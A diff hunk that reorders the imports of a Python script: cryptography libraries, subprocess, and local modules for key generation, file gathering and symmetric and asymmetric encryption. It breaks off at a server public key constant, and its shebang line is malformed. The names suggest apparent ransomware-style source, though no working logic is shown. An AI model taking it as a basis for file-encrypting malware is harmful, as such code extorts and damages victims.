@@ -1,24 +1,26 @@
 #!/bin/bash/env python
 # coding=UTF-8
 
-import os
-import string
-import random
-import time
+import generate_keys
 import asymmetric
 import get_files
 import symmetric
 import enviroment
-import generate_keys
-from Crypto.PublicKey import RSA
+
+import os
+import string
+import random
+import time
 import gc
-from Crypto.Hash import MD5
 import base64
 import pickle
+
+from Crypto.PublicKey import RSA
+import subprocess
+from Crypto.Hash import MD5
 from Crypto.Hash import SHA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
-import subprocess
 
 # const variables
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
